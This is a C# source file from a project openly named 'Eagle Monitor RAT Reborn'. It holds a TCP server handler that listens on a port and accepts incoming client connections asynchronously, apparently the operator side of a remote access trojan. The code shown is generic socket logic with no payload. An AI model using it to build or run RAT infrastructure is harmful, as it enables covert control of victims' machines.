using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Windows.Forms;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Eagle_Monitor_RAT_Reborn.Network
{
    internal class ServerHandler : IDisposable
    {
        static ServerHandler()
        {
            StopServer = false;
            Servers = new List<ServerHandler>();
            acceptClientAsync = new AcceptClientAsync(AcceptClient);
        }

        internal readonly static List<ServerHandler> Servers;
        internal static int CurrentServersNumber { get { return Servers.Count; } }
        internal static bool StopServer { get; set; }

        private static readonly AcceptClientAsync acceptClientAsync;
        private delegate ClientHandler AcceptClientAsync(ServerHandler serverHandler);

        #region "Non Static"
        private int ServerPort { get; set; }
        internal Socket socket;

        internal ServerHandler(int port) : base()
        {
            Servers.Add(this);
            ServerPort = port;
            IPEndPoint endPoint = new IPEndPoint(IPAddress.Any, port);
            socket = new Socket(endPoint.AddressFamily, SocketType.Stream, ProtocolType.Tcp);
            try
            {
                socket.Bind(endPoint);
                socket.Listen(int.MaxValue);
                StartAcceptClient(this);
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.ToString());
            }
        }
        #endregion

        private static void StartAcceptClient(ServerHandler serverHandler)
        {
            acceptClientAsync.BeginInvoke(serverHandler, new AsyncCallback(EndAcceptClient), serverHandler);
        }

        private static ClientHandler AcceptClient(ServerHandler serverHandler)
        {
            if(!StopServer)
                return new ClientHandler(serverHandler.socket.Accept(), serverHandler.ServerPort);
            else
                return null;
        }

        private static void EndAcceptClient(IAsyncResult ar)
        {
            acceptClientAsync.EndInvoke(ar);
            ServerHandler serverHandler = (ServerHandler)ar.AsyncState;
            if (!StopServer)
                ServerHandler.StartAcceptClient(serverHandler);
            else
                serverHandler.Dispose();
        }

        public void Dispose() 
        {
            this.socket.Shutdown(SocketShutdown.Both);
            this.socket.Close();
            this.socket?.Dispose();
        }
    }
}
